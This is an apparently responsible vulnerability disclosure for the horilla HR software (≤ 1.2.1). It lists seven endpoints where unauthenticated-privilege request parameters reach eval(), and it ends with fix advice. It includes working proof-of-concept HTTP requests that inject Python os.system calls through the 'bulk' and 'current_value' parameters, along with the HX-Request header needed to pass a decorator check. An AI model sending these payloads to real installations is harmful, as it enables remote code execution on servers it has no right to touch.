# BUG_Author

YiLin Li

# Affected version

horilla ≤ 1.2.1

# Vender

[www.horilla.com](https://www.horilla.com/)

# Software

![image](https://github.com/user-attachments/assets/509f75d7-ae1b-4ebd-8a49-601b74a69f73)

# Vulnerability File

attendance/views/requests.py → `request_new()`

attendance/views/requests.py → `get_employee_shift()`

payroll/views/component_views.py → `create_reimbursement()`

pms/views.py → `key_result_current_value_update()` 

pms/views.py → `create_meetings()`

recruitment/views/views.py → `create_skills()`

# Description

Multiple remote command execution vulnerabilities were found in horilla. Multiple handlers in horilla did not perform reasonable privilege checks, allowing request parameters from external sources to be passed into the eval() method, which ultimately led to the vulnerabilities.

|  | URL | Vulnerability parameter | Request method |
| --- | --- | --- | --- |
| 1 | /attendance/request-new-attendance | bulk | GET |
| 2 | /attendance/get-employee-shift | bulk | GET |
| 3 | /payroll/create-reimbursement | instance_id | GET |
| 4 | /pms/key-result-current-value-update | current_value | POST |
| 5 | /pms/key-result-current-value-update | emp_key_result_id | POST |
| 6 | /pms/create-meeting | instance_id | GET |
| 7 | /recruitment/create-skills/ | instance_id | GET |

## Status

Critical

## Code Analysis

I will analyse the code that causes the vulnerability at each handler

1. The cause of the vulnerability at /attendance/request-new-attendance is as follows:

![image](https://github.com/user-attachments/assets/5e6d5773-a682-4261-9e55-1219e1c70303)

where input from bulk is unfiltered and executed as python code.

2. The cause of the vulnerability at /attendance/get-employee-shift is as follows:
    
![image](https://github.com/user-attachments/assets/89121e82-3c5f-475b-b38e-91dba9801e93)

where input from bulk is unfiltered and is executed as code, the value of employ_id is irrelevant.

3. The cause of the vulnerability at /payroll/create-reimbursement is as follows:

![image](https://github.com/user-attachments/assets/ab5b5efd-1deb-40e1-b59e-b97ecf3118b9)

where the input from instance_id is not filtered and is executed as code.

4/5.  The cause of the vulnerability at /pms/key-result-current-value-update and /pms/key-result-current-value-update is as follows:

![image](https://github.com/user-attachments/assets/53b9840a-8614-48fc-a2d4-c3718c2ffb2d)

Where inputs from current_value and emp_key_result_id are not filtered and are executed as code.

6. The cause of the vulnerability at /pms/create-meeting is as follows:

![image](https://github.com/user-attachments/assets/f9389717-6ef0-444e-ac5b-b4fd18262b7a)

where the input from instance_id is not filtered and is executed as code.

7. The cause of the vulnerability at /recruitment/create-skills/ is as follows:

![image](https://github.com/user-attachments/assets/e581a27c-1340-439f-8cbb-ce36c30688e0)

where the input from instance_id is not filtered and is executed as code.

## Trigger the vulnerability

The causes of these vulnerabilities are similar, so I've chosen the view function located on `/attendance/request-new-attendance` and `/pms/key-result-current-value-update` to illustrate how vulnerabilities can be triggered

Firstly, I created a normal user ‘spiderman’ with minimum privileges. In the Django backend, you can see that ‘spiderman’ is not an administrator and does not have any permissions.

![image](https://github.com/user-attachments/assets/78aef6e8-2966-4700-8de1-ede90ea63822)

Subsequently, use spiderman to log into horilla and record the `csrftoken` in the cookie and the `csrfmiddlewaretoken` in the parameter when logging in.

![image](https://github.com/user-attachments/assets/0efa3d3d-c81c-4179-806b-aadf012bbb63)

**For the first vulnerability:** Construct a GET request to access `/attendance/request-new-attendance` using the sessionid of the logged-in session, with the request parameters `bulk=__import__('os').system('touch /home/lyl/hackInAttendance')`

![image](https://github.com/user-attachments/assets/3fb3808f-fb20-451a-872b-d4cda6566d20)

Notice that the Handler uses the **@hx_request_required** decorator for bypassing, so the following needs to be added additionally to the request header:

***HX-Request: true***

After sending this request, we can see the file `/home/lyl/hackInAttendance` being created on the horilla server, indicating that the code was executed successfully.

![image](https://github.com/user-attachments/assets/c09a2979-a95c-4ebc-bc55-a4cf505cad7b)

**For the second vulnerability:** Construct a POST request to access `/pms/key-result-current-value-update` using the **`sessionid`** of the logged-in session and the previously recorded **`csrftoken`** and **`csrfmiddlewaretoken`**, with the request parameters `current_value=__import__('os').system('touch /home/lyl/hackInPms')`

![image](https://github.com/user-attachments/assets/340d6c89-6f06-4dcf-9a78-f7d2043dff9b)

After sending this request, we can see the file `/home/lyl/hackInPms` being created on the horilla server, indicating that the code was executed successfully.

![image](https://github.com/user-attachments/assets/12f3a1b7-970a-48c5-93fa-09683d988d3e)

# Payload

`/attendance/request-new-attendance`

```
GET http://192.168.0.166:8000/attendance/request-new-attendance?bulk=__import__('os').system('touch%20%2fhome%2flyl%2fhackInAttendance') HTTP/1.1
Host: 192.168.0.166:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.166:8000/
HX-Request: true
Connection: close
Cookie: csrftoken=9eoX7czN8uY81y5W7OmIThrOcpc3JgPV; sessionid=bd8vz27cj76r5krhsbaphl1l6ewl3hqt

```

`/attendance/request-new-attendance`

```
POST http://192.168.0.166:8000/pms/key-result-current-value-update HTTP/1.1
Host: 192.168.0.166:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.166:8000/
Connection: close
Cookie: sessionid=bd8vz27cj76r5krhsbaphl1l6ewl3hqt; csrftoken=tyvez4ZtrW9QOPZJbu1JE1EfX58khXFD
Content-Type: application/x-www-form-urlencoded
Content-Length: 159

current_value=__import__('os').system('touch%20%2fhome%2flyl%2fhackInPms')&csrfmiddlewaretoken=EcnYepzWpk3uctWQNtBthvlf3jPWdbk0XAI2DjofG62aQ8LpONs2LmPkQeN6kYPt
```

## Fix Recommendations

1. Add permission decorators to each Handler
2. Whitelisting or regular filtering of arguments before calling the eval() method
